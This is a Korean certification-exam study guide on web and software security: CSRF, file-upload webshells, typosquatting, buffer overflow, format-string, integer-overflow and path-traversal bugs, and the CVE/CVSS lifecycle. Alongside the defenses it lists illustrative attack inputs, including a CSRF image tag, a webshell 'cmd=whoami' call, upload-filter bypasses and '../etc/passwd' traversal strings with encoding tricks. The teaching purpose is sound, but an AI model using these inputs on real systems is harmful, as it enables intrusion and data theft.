**CSRF(Cross-Site Request Forgery, 크로스 사이트 요청 위조)**는 로그인된 피해자의 브라우저가 피해자 의도와 상관없이 특정 요청(송금·글쓰기·설정 변경 등)을 보내도록 유도하는 공격이다. 피해자가 이미 그 사이트에 로그인한 상태로 공격자 사이트를 방문하면, 브라우저가 세션 쿠키를 자동으로 붙여 요청을 보내기 때문에 서버는 정상 사용자의 요청으로 착각한다.

공격 시나리오는 이렇다.

1. 피해자가 bank.com에 로그인 → 브라우저에 "피해자로 로그인된 상태"라는 신분증 역할의 세션 쿠키 저장 (세션 ID·인증 토큰 등)
2. 피해자가 공격자의 페이지 evil.com 방문
3. evil.com에 숨겨진 이미지 태그: `<img src="https://bank.com/transfer?to=attacker&amount=1000000" />`
4. 피해자 브라우저가 이 URL을 요청하면서 목적지(bank.com)의 쿠키를 자동 첨부 (요청이 evil.com에서 시작됐는지와 무관)
5. bank.com은 쿠키 속 신분증을 보고 "피해자 본인의 송금 요청"으로 오인해 공격자에게 100만 원 송금

공격자는 비밀번호를 몰라도, 피해자 브라우저가 들고 있던 로그인 신분증(세션 쿠키)을 그대로 빌려 쓰는 셈이다. 피해자는 영문도 모른 채 쿠키를 목에 건 채로 조종당한다.

```mermaid
제목: 피해자 브라우저가 쿠키를 붙여 보낸 요청을 bank.com은 본인 요청으로 믿는다
flowchart LR
  V("피해자<br>bank.com 로그인 상태") -->|"방문"| E("evil.com<br>숨긴 img 태그")
  E -->|"송금 요청 + 쿠키 자동 첨부"| B("bank.com")
  B -->|"100만 원 송금"| A("공격자")
```

XSS와 헷갈리기 쉬워서 표로 나란히 놓으면 이렇다.

| 구분 | XSS | CSRF |
|---|---|---|
| 실행 위치 | 피해자 브라우저에서 스크립트 실행 | 스크립트 필요 없음, 요청을 보내기만 함 |
| 공격 대상 | 피해자의 데이터 (쿠키·세션 탈취) | 피해자의 권한 행사 (송금·변경) |
| 필요 조건 | 취약 페이지가 스크립트를 실행함 | 피해자가 사이트에 로그인된 상태 |

#### 5. 파일 업로드 취약점 (Unrestricted File Upload)
**파일 업로드 취약점**은 서버가 업로드된 파일 종류를 제대로 검증하지 않아, 공격자가 실행 가능한 파일(웹쉘)을 올리고 웹에서 직접 호출해 서버를 장악하는 공격이다.

공격 흐름은 이렇다.

1. 공격자가 `shell.php`·`shell.jsp` 같은 웹쉘 업로드
2. 서버가 `/uploads/shell.php`로 저장
3. 공격자가 `https://site.com/uploads/shell.php?cmd=whoami` 호출
4. 서버가 PHP/JSP로 해석·실행 → 공격자 명령 수행, 서버 쉘 획득

검사를 피하는 우회 기법은 넷이다.

- **확장자 대소문자**: `.php` 금지 → `.PHP`·`.pHp` 시도
- **이중 확장자**: `.jpg.php`
- **MIME 조작**: 요청 헤더의 Content-Type만 `image/jpeg`로 변경
- **파일 시그니처**: 파일 시작에 JPEG 매직 바이트를 심어 "이미지로 보이지만 실제는 PHP"

겉은 .jpg, 속은 .php인 셈이다. 검사대가 겉포장만 보면 폭탄이 그대로 서버로 들어간다.

```mermaid
제목: 겉은 .jpg, 속은 .php. 겉포장만 보는 검사대를 통과해 서버를 장악한다
flowchart LR
  A("공격자<br>.jpg로 위장한 shell.php") --> C{"업로드 검사대"}
  C -->|"통과"| S("서버<br>웹쉘 실행")
```

### 공통 대응
웹 공격 전반에 공통으로 적용하는 방어 계층을 정리하면 이렇다.

| 대응 | 방어 계층 | 주 타겟 |
|---|---|---|
| 입력 검증 | 애플리케이션 (서버) | 모든 공격의 1차 방어선 |
| 출력 인코딩 | 애플리케이션 (서버) | XSS |
| Prepared Statement | 애플리케이션 (서버) | SQL Injection |
| CSRF 토큰 | 애플리케이션 (서버) | CSRF |
| HttpOnly / Secure / SameSite 쿠키 | 애플리케이션 + 브라우저 | XSS·CSRF |
| CSP (Content Security Policy) | 브라우저 | XSS |
| WAF (Web Application Firewall) | 네트워크 계층 | 시그니처 기반 차단 (보조) |
| HTTPS / TLS | 전송 계층 | 스니핑·세션 하이재킹 방지 |

WAF는 만능이 아니다. 애플리케이션 수준의 대응을 가장 먼저 하고, WAF는 "방어 심화(defense in depth)" 차원의 추가 계층으로 쓴다.

### 기출에서 이렇게 나왔다

### 답 쓸 때
SQL Injection은 영문으로 쓰거나 "SQL 삽입 공격"으로 쓴다. XSS는 Cross-Site Scripting인데, 그대로 줄이면 CSS와 겹치기 때문에 X를 쓴다. CSRF는 XSRF라고도 한다.

## 보안 신기술 용어 (TrustZone·Typosquatting)
출제: 22-3
형태: 설명 2개 → 용어 2개(한 문제)

### 개념
여기는 한 번씩 나온 보안 용어와 그 주변 용어를 모아 둔 곳이다. 22-3에서는 TrustZone과 Typosquatting을 한 문제 안의 두 칸으로 물었다. 다크 데이터·블록체인 같은 용어는 [신기술] 페이지에 있다.

### 한눈에 구분
| 용어 | 지문에서 쓰이는 단서 | 헷갈리는 것 → 가르는 법 |
|---|---|---|
| **TrustZone** | ARM 프로세서가 하드웨어 수준에서 일반 영역(Normal World)과 보안 영역(Secure World)을 나눠 실행 |  |
| **Typosquatting** | 유명 사이트 주소의 오타(철자 바꿈·빠뜨림)를 미리 도메인으로 등록해 잘못 입력한 사용자를 가짜 사이트로 유도 | 파밍과 헷갈림 → DNS 조작이면 파밍, 사용자 오타면 타이포스쿼팅 |
| **크리덴셜 스터핑(Credential Stuffing)** | 유출된 ID·비밀번호 목록을 다른 사이트에 그대로 대입 | 무차별 대입과 헷갈림 → 조합을 만들지 않고 유출 목록을 그대로 대입하면 크리덴셜 스터핑 |
| **블루재킹 / 블루스나핑 / 블루버그** | 블루투스로 원치 않는 메시지 전송 / 데이터 몰래 빼냄 / 기기를 원격 제어 |  |
| **스턱스넷(Stuxnet)** | 산업 제어 시스템(PLC)을 노린 웜 |  |
| **좀비 PC** | 악성코드에 감염돼 봇넷의 일원이 된 PC |  |

### 보안 용어 하나씩 보기
22-3의 두 정답을 먼저 보고, 나머지 주변 용어를 이어서 본다.

#### 1. TrustZone
- ARM 프로세서의 하드웨어 수준 영역 분리
- 일반 영역(Normal World)과 보안 영역(Secure World)을 나눠 실행
- 모바일 결제·생체 정보 보호에 사용
- 하드웨어 기반 TEE(신뢰 실행 환경)

> 예: 스마트폰에서 지문으로 결제할 때, 지문을 비교하는 일은 일반 앱이 돌아가는 Normal World가 아니라 하드웨어로 분리된 Secure World에서 한다. 일반 영역의 앱이 악성코드에 감염돼도 보안 영역 안의 지문 데이터에는 손대지 못한다.

소프트웨어가 아니라 프로세서(하드웨어) 수준에서 영역을 나눈다는 점이 단서다.

#### 2. Typosquatting
- 유명 사이트 주소의 오타(철자 바꿈·빠뜨림)를 미리 도메인으로 등록
- 잘못 입력한 사용자를 가짜 사이트로 유도
- URL 하이재킹이라고도 함
- 유명 상표·기업명 도메인을 선점하는 사이버스쿼팅 가운데 오타를 이용하는 방식
- 가짜 사이트도 HTTPS 인증서를 받을 수 있어 자물쇠 표시만으로는 진짜인지 판단 불가

> 예: 유명 포털 주소에서 철자 하나를 바꾸거나 빠뜨린 주소를 공격자가 미리 등록해 둔다. 급하게 주소를 치다 오타를 낸 사용자는 진짜와 비슷하게 꾸민 가짜 사이트에 들어가게 된다.

파밍은 DNS를 조작하고 타이포스쿼팅은 사용자의 오타를 노린다. 사용자가 가짜 사이트에 접속하게 된다는 결과는 같아서 수단으로 가른다.

#### 3. 크리덴셜 스터핑 (Credential Stuffing)
- 유출된 ID·비밀번호 목록을 다른 사이트에 그대로 대입

> 예: 어느 쇼핑몰에서 ID·비밀번호 목록이 유출됐다. 공격자는 같은 ID·비밀번호를 은행, 메일 서비스에 그대로 넣어 본다. 여러 사이트에 같은 비밀번호를 쓰는 사람은 여기서 뚫린다.

무차별 대입은 조합을 새로 만들어 보지만, 크리덴셜 스터핑은 이미 유출된 조합을 그대로 쓴다.

#### 4. 블루재킹·블루스나핑·블루버그 (Bluejacking·Bluesnarfing·Bluebugging)
- 블루재킹: 블루투스로 원치 않는 메시지 전송
- 블루스나핑: 블루투스로 데이터를 몰래 빼냄
- 블루버그: 블루투스로 기기를 원격 제어
- 세 가지는 피해 강도 순

> 예: 지하철에서 블루투스를 켜 둔 휴대폰에 모르는 광고 메시지가 뜨면 블루재킹이다. 같은 상황에서 연락처나 사진이 몰래 빠져나가면 블루스나핑, 공격자가 그 휴대폰으로 전화를 걸거나 기기를 조작하면 블루버그다.

메시지, 데이터 탈취, 원격 제어 순으로 피해가 커진다. 표의 "피해 강도 순"이 이 순서다.

#### 5. 스턱스넷 (Stuxnet)
- 산업 제어 시스템(PLC)을 노린 웜
- 사이버 무기의 대표 사례

> 예: 사무용 PC의 정보를 빼 가는 대신, 산업 현장에서 설비를 움직이는 제어 장치(PLC)를 표적으로 삼았다.

웜이므로 「악성 코드」 묶음의 기준으로는 숙주 없이 스스로 퍼지는 쪽이다. 다만 정보가 아니라 설비를 움직이는 장치를 노렸다는 점이 흔한 웜과 다르다.

#### 6. 좀비 PC
- 악성코드에 감염돼 봇넷의 일원이 된 PC
- DDoS 세트 참고

> 예: 평소처럼 쓰는 PC가 사실은 악성코드에 감염돼 봇넷에 들어가 있다. C&C 서버의 명령이 오면 DDoS 공격에 가담하는데, 주인은 알아채지 못하는 경우가 많다.

감염된 PC 한 대 한 대가 좀비 PC이고, 그 무리가 봇넷이다.

### 기출에서 이렇게 나왔다
- 22-3: 설명 2개 → **TrustZone / Typosquatting**

### 답 쓸 때
답은 영문 표기 그대로 쓴다. Typosquatting은 Typo + squatting(무단 점거)이니, 말 그대로 오타 난 주소를 무단 점거한다는 뜻이다. 가짜 사이트로 유도하는 피싱·파밍·타이포스쿼팅 셋은 결과가 같으니 수단으로 가른다. 메일 링크면 피싱, DNS 조작이면 파밍, 주소 오타면 타이포스쿼팅이다.

### 기출 문제

:::q 22-3 9번
다음 ( ) 안에 들어갈 알맞은 용어를 쓰시오.

- ( ① )은/는 프로세서 안에 독립적인 보안 구역을 따로 두어 중요한 정보를 보호하는 ARM사에서 개발한 하드웨어 기반의 보안 기술이다.
- ( ② )은/는 사용자들이 사이트에 접속할 때 주소를 잘못 입력하는 실수를 이용하여 유사한 유명 도메인을 미리 등록하는 일이다.

## SW 개발 보안 취약점 (버퍼 오버플로·포맷 스트링)
출제: 없음

### 개념
**소프트웨어 개발 보안 취약점**이란 프로그래밍 과정의 실수로 코드에 남는 보안 결함을 말한다. 시스템 공격이 "운영 환경의 허점"을 노린다면, 소프트웨어 취약점은 "코드 자체의 허점"을 노린다. 대표 분류 체계는 셋이다.

- **OWASP**: 웹 애플리케이션 보안 프로젝트, "OWASP Top 10" 같은 대표 취약점 목록 발간
- **CWE(Common Weakness Enumeration)**: 소프트웨어 취약점 유형을 번호로 목록화한 표준 (예: CWE-120 버퍼 오버플로)
- **국내 시큐어 코딩 가이드**: 행정안전부·KISA가 제시한 7대 원칙 (이 묶음 마지막 소제목)

이 묶음에서 볼 취약점 넷을 먼저 표로 정리하면 이렇다.

| 취약점 | 원인 | 결과 | 핵심 대응 |
|---|---|---|---|
| 버퍼 오버플로 | 버퍼 경계 검사 누락 | 메모리 덮어쓰기, 임의 코드 실행 | 안전한 문자열 함수, Canary·ASLR·DEP |
| 포맷 스트링 | 사용자 입력을 형식 문자열로 사용 | 메모리 읽기/쓰기, 정보 유출 | 형식 문자열을 상수로 고정 |
| 정수 오버플로 | 자료형 표현 범위 초과 | 음수 전환, 작은 할당 → 힙 오버플로 | 연산 전후 범위 검사, 큰 타입 사용 |
| 경로 조작 | 사용자 입력을 파일 경로로 그대로 사용 | 의도하지 않은 파일 접근 | 입력 검증, 화이트리스트, canonical path 비교 |

### 코드 취약점 하나씩 보기

#### 1. 버퍼 오버플로 (Buffer Overflow)
**버퍼 오버플로(BoF)**는 프로그램이 버퍼 크기를 넘는 데이터를 기록해 옆 메모리를 덮어쓰는 취약점이다. 고전적이면서도 가장 위험한 취약점 중 하나이고, 위치(스택·힙)에 따라 두 종류로 나뉜다.

**스택 버퍼 오버플로**는 스택 영역에 할당된 지역 변수 버퍼가 넘치는 경우다. 스택 프레임에는 함수의 리턴 주소가 함께 저장되어 있어서, 공격자가 오버플로로 리턴 주소를 자기 악성 코드(셸코드) 주소로 덮어쓰면 임의 코드를 실행할 수 있다. 위험한 C 표준 함수와 안전한 대체 함수는 짝으로 외운다.

| 위험한 함수 | 문제 | 안전한 대체 함수 | 제한 |
|---|---|---|---|
| `strcpy(dst, src)` | 길이 검사 없이 복사 | `strncpy(dst, src, n)` | 최대 n 바이트까지만 복사 |
| `gets(buf)` | 길이 검사 없이 표준 입력 받음 | `fgets(buf, n, stdin)` | 최대 n-1 바이트까지만 읽음 |
| `sprintf(buf, fmt, ...)` | 포맷 결과 길이 무제한 | `snprintf(buf, n, fmt, ...)` | 최대 n-1 바이트까지만 기록 |

**힙 버퍼 오버플로**는 `malloc()`·`new`로 할당한 힙 영역 버퍼가 넘치는 경우다. 스택처럼 "리턴 주소"가 뚜렷하지는 않지만, 옆에 있는 할당 메타데이터나 함수 포인터를 덮어써 실행 흐름을 가로챌 수 있다.

대응은 세 수준에서 한다.

- **코드 수준**: 안전한 문자열 함수 사용, 입력 길이 검증, 경계 검사 로직 추가
- **컴파일러·런타임**: Stack Canary(함수 호출 때 스택 프레임에 랜덤 값을 심고 리턴 직전에 변조 여부 검사), DEP(Data Execution Prevention) / NX bit(데이터 영역인 스택·힙의 실행 권한을 없애 셸코드 실행 차단), ASLR(Address Space Layout Randomization, 메모리 영역 주소를 실행할 때마다 랜덤화해 셸코드 주소를 맞히기 어렵게 함)
- **언어 선택**: 경계 검사가 내장된 언어(Rust·Go·Java 등) 사용도 근본 대응

다만 버퍼 오버플로를 C/C++ 고유의 문제로 보면 안 된다. C/C++에서 가장 자주 나타나긴 하지만 '언어 결함'이라기보다 '경계 검사 누락'이라는 논리적 실수다. 안전한 언어를 쓴다고 모든 메모리 버그가 사라지지 않고, 안전한 함수를 써도 n 값을 잘못 계산하면 똑같이 오버플로가 난다.

#### 2. 포맷 스트링 공격 (Format String Attack)
**포맷 스트링 취약점**은 `printf`·`fprintf`·`sprintf` 같은 형식 문자열 함수에 사용자 입력을 그대로 넘길 때 생긴다. 공격자는 형식 지정자(`%s`·`%x`·`%n`)를 문자열에 넣어 메모리를 읽거나 쓰게 만든다. 위험한 패턴과 안전한 패턴을 나란히 보면 이렇다.

```c
// 위험: user_input이 그대로 형식 문자열로 해석됨
printf(user_input);

// 안전: "%s" 형식 문자열은 프로그래머가 고정
printf("%s", user_input);
```

| 형식 지정자 | 공격 효과 |
|---|---|
| `%x` | 스택 메모리를 16진수로 출력 → 메모리 정보 유출 |
| `%s` | 스택에서 포인터를 꺼내 그 주소의 문자열 출력 → 크래시 또는 유출 |
| `%n` | 지금까지 출력한 바이트 수를 해당 주소에 기록 → 메모리 쓰기 |

이 중 `%n`이 가장 위험하다. 공격자가 원하는 주소에 원하는 값을 기록할 수 있어서 임의 코드 실행까지 이어질 수 있기 때문이다.

- 대응: 형식 문자열은 반드시 상수로 고정하고 사용자 입력은 인자로만 전달
- 대응: 정적 분석 도구로 `printf(user_input)` 패턴 탐지 (`-Wformat-security` 경고)
- 대응: `%n` 비활성화 옵션이 있는 런타임 사용 (일부 리눅스 배포판 기본값)

#### 3. 정수 오버플로 (Integer Overflow)
**정수 오버플로**는 정수형 변수가 자료형의 최댓값(또는 최솟값)을 넘어 예상과 다른 값으로 뒤바뀌는 현상이다. 그 자체로는 수학 오류지만, 그 값이 메모리 할당 크기로 쓰이면 힙 오버플로로 이어진다. 전형적인 패턴은 이렇다.

```c
// count가 공격자 입력. 매우 큰 값(예: 0xFFFFFFFF)을 주면
// count * sizeof(int)가 오버플로되어 아주 작은 값이 됨
int *buf = malloc(count * sizeof(int));

// 실제 할당은 작지만, 아래 루프는 공격자가 원하는 만큼 반복
for (int i = 0; i < count; i++) {
    buf[i] = 0; // → 힙 오버플로
}
```

| 유형 | 설명 |
|---|---|
| 부호 있는 오버플로 (Signed Overflow) | INT_MAX를 넘으면 음수로 랩어라운드, C 표준은 "정의되지 않은 동작"으로 취급 |
| 부호 없는 오버플로 (Unsigned Overflow) | UINT_MAX를 넘으면 0으로 랩어라운드 (정의된 동작이지만 논리 오류 유발) |
| 정수 언더플로 (Underflow) | 0에서 -1로 갈 때 부호 없는 타입은 아주 큰 값이 됨 |
| 부호 변환 (Sign Conversion) | 음수를 부호 없는 타입으로 넘기면 매우 큰 양수가 됨 |

- 대응: 연산 전에 범위 검사 (`if (count > MAX_ALLOWED) return;`)
- 대응: 가능한 한 큰 타입 사용 (`size_t`·`int64_t`)
- 대응: 언어·라이브러리가 제공하는 안전 산술 함수 사용 (C11 `ckd_add()` 등)

#### 4. 경로 조작 (Path Manipulation)
**경로 조작(Path Manipulation, Path Traversal, Directory Traversal, 디렉터리 트래버설)**은 사용자 입력을 파일 경로로 그대로 쓸 때, 공격자가 `../` 같은 상위 디렉터리 이동 시퀀스를 넣어 의도하지 않은 파일에 접근하는 취약점이다. 일반 애플리케이션에서는 "경로 조작", 웹 환경에서는 "디렉터리 트래버설"이라고 부르지만 본질은 같다.

일반 애플리케이션의 위험한 패턴부터 보자. `/var/www/download/`는 루트에서 세 단계 아래이므로, 루트까지 올라가려면 `../`가 세 번 필요하다.

```java
// user_file이 "../../../etc/passwd" 같은 값이면
// download 디렉터리를 벗어나 임의 시스템 파일을 읽을 수 있음
File f = new File("/var/www/download/" + user_file);
```

웹 요청에서는 이렇게 나타난다.

```text
GET /download?file=../../../etc/passwd HTTP/1.1
```

서버가 단순히 `/var/www/files/`에 file 파라미터를 이어 붙이면 `/var/www/files/../../../etc/passwd`, 곧 `/etc/passwd`가 되어 시스템 계정 목록이 노출된다. `../` 하나가 한 단계씩 올라가서 files → www → var → 루트(/) 순서로 거슬러 오른 다음 `etc/passwd`로 내려가는 것이다. `../`를 두 번만 넣으면 `/var/etc/passwd`에서 멈춰 루트에 닿지 못한다.

```steps
제목: ../로 폴더 계단을 거꾸로 올라 금고(/etc/passwd)에 닿는다
/var/www/files/ | 출발
../ | /var/www/
../ | /var/
../ | / (root)
etc/passwd | /etc/passwd 노출
```

검사를 피하는 우회 기법은 넷이다.

- **URL 인코딩**: `..%2F..%2Fetc%2Fpasswd`
- **이중 URL 인코딩**: `%252e%252e%252f`
- **유니코드 치환**: `../`를 유니코드 문자로 바꿔 표기
- **NULL 바이트 삽입**: `../../etc/passwd%00.jpg`

대응은 넷이다.

- **입력 검증**: `..`·`/`·`\`·NULL 바이트 등 금지 문자 필터링
- **화이트리스트**: 허용 파일 목록(또는 다운로드용 파일 ID)과 정확히 일치하는 입력만 허용
- **Canonical Path 비교**: 실제 접근 직전에 경로를 정규화(`realpath`·`getCanonicalPath`)한 뒤 허용된 기준 디렉터리의 하위인지 검사
- **Chroot / 샌드박스**: 프로세스가 접근할 수 있는 루트 자체를 제한

### 시큐어 코딩 7대 원칙
행정안전부·KISA의 소프트웨어 개발보안 가이드는 취약점을 7개 영역으로 나누고 영역마다 코딩 원칙을 제시한다. 실기에서 항목 암기형으로 자주 나온다.

| 원칙 | 핵심 | 대표 취약점 |
|---|---|---|
| 입력 데이터 검증·표현 | 입력을 신뢰하지 말 것 | SQL Injection, XSS, 버퍼 오버플로, 경로 조작 |
| 보안 기능 | 인증·권한·암호를 올바르게 구현 | 부적절한 인가, 하드코딩된 비밀번호 |
| 시간 및 상태 | 동시성·순서 문제 관리 | 레이스 컨디션(TOCTOU), 세션 고정 |
| 에러 처리 | 오류 메시지·예외 노출 방지 | 스택 트레이스 노출, 예외 처리 누락 |
| 코드 오류 | 런타임 오류 유발 코드 방지 | Null 참조, 정수 오버플로, 메모리 누수 |
| 캡슐화 | 객체·데이터 은닉 | 제어되지 않은 외부 접근, 디버그 코드 잔존 |
| API 오용 | 표준 API를 의도된 방식으로 사용 | 위험한 문자열 함수(strcpy), 금지된 API 사용 |

이 묶음에서 본 취약점을 원칙에 대 보면, 버퍼 오버플로는 "입력 데이터 검증" + "API 오용", 포맷 스트링은 "입력 데이터 검증", 정수 오버플로는 "코드 오류", 경로 조작은 "입력 데이터 검증"에 해당한다. 원칙과 취약점을 이어서 외워 두면 단답형·서술형 모두 대응할 수 있다.

## 취약점 생명주기 (제로데이·CVE·CVSS·CWE)
출제: 없음

### 개념
보안 취약점은 발견된 순간부터 패치(취약점을 고치거나 버그를 수정하는 소프트웨어 업데이트)가 적용될 때까지 단계별로 상태가 바뀐다. 같은 취약점(같은 CVE 번호)이라도 시간이 지나면서 제로데이 → 1-day → 알려진 취약점(Known)으로 상태가 넘어간다.

여기서 중요한 점은 취약점을 SQL Injection, XSS 같은 코드 결함의 "종류"로만 보지 말고, 패치 대응 시점이라는 "상태"로도 봐야 한다는 것이다. 같은 취약점이라도 지금 제로데이라면 패치가 없어서 당하고, 1-day 단계에서는 패치가 있는데도 적용하지 않아서 당한다. 그래서 취약점은 두 축으로 분류한다.

- **종류 축(CWE)**: 어떤 코드 결함인가. SQL Injection, XSS, Buffer Overflow 등 (CWE는 아래 표에서 설명)
- **상태 축(생명주기)**: 패치가 공개·적용되었나. 제로데이 / 1-day / Known

상태는 크게 3단계(제로데이·1-day·Known)로 보고, 맨 처음 '발견' 시점까지 넣으면 4단계로 나눈다.

### 생명주기 4단계

| 단계 | 상태 | 설명 | 위험도 |
|---|---|---|---|
| 1 | 발견(Discovery) | 연구자·공격자·내부자가 취약점 존재를 최초 인지 | - |
| 2 | 제로데이(0-day) | 패치가 공개되지 않은 상태, 공격자만 알고 있을 수 있음 | 극도로 높음 |
| 3 | 1-day / N-day | 패치는 공개되었지만 적용되지 않은 상태 | 실제 침해사고 대부분 |
| 4 | 알려진 취약점(Known) | 패치 적용 + 탐지 규칙(IDS/IPS/백신) 완비 | 낮음 |

```steps
제목: 시간에 따라 상태가 바뀌는 취약점, 1-day 구간에 공격자가 가장 많이 몰린다
발견 | 최초 인지
제로데이 (0-day) | 패치 없음
패치 공개 |
1-day / N-day | 공격자 대량 유입 (위험도 최고)
패치 적용 |
Known (알려진 취약점) | 안전
```

공격자 입장에서 가장 위험한 "무기"는 제로데이지만, 실제 피해 건수는 1-day 구간에서 가장 많다. 대부분의 기업이 패치를 바로 적용하지 못하기 때문인데, 그 이유는 아래 1-day 소제목에서 본다.

### 상태별로 하나씩 보기

#### 1. 제로데이 취약점 (0-day)
**제로데이**는 개발사도 아직 모르거나 패치가 공개되지 않은 취약점이다. 이름은 "패치가 공개된 지 0일"이라는 뜻에서 왔다. 방어자는 모르는 구멍으로 은밀히 들어오는 셈이다.

- 특징: 공격자만 알고 있을 가능성 → 방어자는 존재 자체를 모름
- 특징: 시그니처 기반 백신·IDS로 탐지 불가 (알려진 패턴이 없음)
- 특징: APT 공격과 워터링 홀 공격에 자주 결합되어 매우 위험
- 대표 사례: Stuxnet(2010), Windows 제로데이 4개를 결합해 이란 원심분리기 파괴
- 대표 사례: Log4Shell(CVE-2021-44228), Log4j(Java 로깅 라이브러리) 원격 코드 실행 취약점, 공개 당시 제로데이였으며 전 세계 Java 서버에 광범위 피해

대응이 어려운 이유는 패치가 없다는 데 있다. 전통적인 "업데이트 적용" 전략이 소용없다. 제로데이는 사거나 개발하는 데 막대한 자원이 들어서 주로 APT 같은 국가 지원 그룹이 쓰고, 막으려면 행위 기반 탐지(EDR), 네트워크 세그먼테이션, 제로트러스트처럼 '안전하다는 가정'을 하지 않는 방어가 필요하다.

헷갈리기 쉬운 점이 하나 있다. 제로데이는 '취약점 종류'가 아니라 '상태'다. SQL Injection·XSS·Buffer Overflow 같은 분류(CWE)와 달리, 제로데이는 '패치가 공개되었는가'라는 시간 축의 상태다. 같은 CVE 취약점도 시간이 지나면 제로데이 → 1-day → Known으로 바뀐다.

#### 2. 1-day(N-day) 취약점
**1-day(또는 N-day)**는 패치가 공개되었지만 아직 적용하지 않은 취약점이다. 1-day와 N-day는 사실상 같은 말로, 패치 공개 후 하루든 여러 날이든 미적용 구간 전체를 가리킨다. 패치 공개라는 깃발이 꽂히는 순간 공격자 군단이 몰려드는 구간이다.

- 특징: 패치 공개 = 공격 기법·PoC(Proof of Concept) 공개 → 공격자가 대량 스캔 시작
- 특징: 실무에서 가장 많은 피해가 나는 구간

그럼 왜 제로데이보다 피해가 클까? 제로데이는 소수의 공격자만 알고 표적을 골라 쓰지만, 1-day는 모든 공격자가 동시에 달려든다. 패치가 공개되면 24시간 안에 전 세계 스캐닝 봇(취약 서버를 자동으로 찾아다니는 공격 프로그램)이 취약 서버를 찾아 공격을 시작하고, 패치 적용이 느린 기업·개인 서버가 집중 공략된다.

예를 들어 A사가 월요일에 패치 공개를 확인했지만 서비스 영향을 이유로 적용을 미뤘다가, 금요일에 랜섬웨어에 감염된다. 패치 공개와 동시에 공격이 시작되는 것이 1-day의 전형적인 패턴이다.

- 대응: SLA(Service Level Agreement, 서비스 수준 협약) 기반 패치 정책, 긴급 패치 프로세스, 가상 패치(WAF 룰)로 임시 보호

#### 3. 알려진 취약점 (Known Vulnerability)
**알려진 취약점**은 패치 적용과 IDS/IPS 탐지 규칙이 갖춰진 상태다. 대부분의 자산에서는 위험도가 낮아지지만, 패치가 빠진 시스템이나 EOL(End-of-Life) 운영체제(예: Windows XP·7처럼 제조사 지원이 끝난 상태)에서는 여전히 공격당할 수 있다.

### 관리 체계: CVE / CVSS / CWE

| 약어 | 무엇인가 | 예시 |
|---|---|---|
| CVE (Common Vulnerabilities and Exposures) | 전 세계 취약점 식별자(고유 번호) | CVE-2021-44228 |
| CVSS (Common Vulnerability Scoring System) | 개별 취약점의 심각도 점수 (0 ~ 10) | Log4Shell: 10.0 (Critical) |
| CWE (Common Weakness Enumeration) | 취약점의 종류·원인 분류 | CWE-89(SQL Injection), CWE-79(XSS), CWE-120(Buffer Overflow) |

CVE는 "이 취약점이 뭐야?"에 답하는 고유 ID, CVSS는 "얼마나 위험해?"에 답하는 점수, CWE는 "어떤 종류야?"에 답하는 분류다. 셋은 역할이 다르니 구분해서 알아 둔다. CVSS 점수는 구간별로 등급이 나뉜다.

| CVSS 점수 | 등급 |
|---|---|
| 9.0 이상 | Critical |
| 7.0 ~ 8.9 | High |
| 4.0 ~ 6.9 | Medium |
| 0.1 ~ 3.9 | Low |

### 공격 유형과의 결합
제로데이와 1-day는 여러 공격에 결합된다.

| 공격 유형 | 어떻게 결합? |
|---|---|
| APT (Advanced Persistent Threat, 지능형 지속 위협) | 공격자가 제로데이를 미리 확보 → 특정 대상을 노리고 오랜 기간 은밀히 침투 |
| 워터링 홀 | 표적이 자주 가는 사이트에 제로데이 기반 악성코드 심기 |
| 랜섬웨어 대량 감염 | 1-day 공개 직후 미패치 서버 스캔 → 대규모 감염 |
| APT + 워터링 홀 결합 | 북한 연계 Lazarus, 러시아 연계 APT29 같은 국가 후원 그룹의 전형적 전술, 제로데이는 구매·개발에 막대한 자원이 필요해 주로 이들이 활용 |

```steps
제목: 제로데이를 확보한 APT 그룹의 장기 표적 침투 시나리오
제로데이 확보 |
사이트 감염 |
표적 침투 |
내부 확산 |
```

시험 지문에 "패치가 없어 탐지·방어가 어렵다", "표적에 맞춤형 악성코드 전달" 같은 말이 나오면 제로데이 + APT 조합을 떠올리면 된다.

### 대응 전략

- **패치 관리(Patch Management)**: 자산 목록(쓰는 서버·PC·SW 목록) → 취약점 스캐닝(자동 도구로 취약 자산 탐지) → 우선순위 기반 패치 배포(Critical → High 순)
- **가상 패치(Virtual Patching)**: WAF·IPS 룰로 임시 차단, 패치 적용까지 시간을 버는 용도
- **행위 기반 탐지(EDR)**: 시그니처 없이도 의심 행위를 탐지해 제로데이에 대응
- **네트워크 세그먼테이션**: 침해 발생 시 횡적 이동(lateral movement) 차단
- **제로트러스트(Zero Trust)**: "내부는 믿을 수 있다"는 가정을 버리고 모든 접근 검증

단일 방어선은 뚫리기 때문에 이 다섯 겹을 바깥부터 쌓는 다층 방어로 자산을 지킨다.

```mermaid
제목: 단일 방어선은 뚫린다. 겹겹이 쌓는 다층 방어(Defense in Depth)
flowchart LR
  X("공격자") --> L1("패치 관리") --> L2("가상 패치") --> L3("EDR") --> L4("네트워크<br>세그먼테이션") --> L5("제로트러스트") --> A(("자산"))
```

정리하면 제로데이는 가장 위험한 상태, 1-day는 가장 많은 피해가 나는 상태다. 공격자에게 제로데이는 탐지되지 않는 무기이고, 1-day는 공개된 기법을 대량 스캐닝으로 쉽게 악용할 수 있는 구간이다. 그래서 개인·기업 모두 '패치 공개 즉시 적용' 정책이 가장 효과적인 방어다.

시험에서는 이렇게 나온다.

- 제로데이는 공격 유형 문제 지문에 "패치가 없어 방어가 어렵다", "탐지가 거의 불가능하다" 같은 힌트로 등장
- 워터링 홀·APT 공격 설명 지문에 자주 결합되어 출제
- CVE / CVSS / CWE는 보안 관리 체계 문제에서 각각의 역할을 묻는 형태로 등장 가능

### 용어 풀이

| 용어 | 뜻 |
|---|---|
| 패치(patch) | 취약점을 고치거나 버그를 수정하는 소프트웨어 업데이트 |
| SQL Injection | 웹 서버 입력값에 DB 질의문(SQL)을 끼워 넣어 데이터를 탈취·조작하는 공격 |
| XSS(Cross-Site Scripting) | 웹 페이지에 악성 스크립트를 삽입해 다른 사용자의 브라우저에서 실행시키는 공격 |
| Buffer Overflow | 할당된 메모리 버퍼 범위를 넘어 인접 메모리를 덮어쓰는 취약점 |
| IDS/IPS | 침입 탐지·방지 시스템, IDS는 탐지만, IPS는 탐지 + 차단 |
| 시그니처(Signature) | 악성코드의 고유 지문 같은 식별 패턴, 시그니처 기반 탐지는 알려진 패턴만 잡음 |
